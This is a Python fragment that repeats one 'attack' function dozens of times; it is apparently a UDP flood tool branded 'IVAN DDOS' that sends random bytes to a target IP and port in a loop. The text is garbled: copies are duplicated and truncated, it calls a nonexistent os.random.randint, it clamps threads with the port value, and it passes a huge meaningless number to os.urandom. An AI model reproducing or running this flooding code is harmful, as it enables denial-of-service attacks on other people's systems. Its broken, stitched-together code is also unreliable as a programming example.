        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
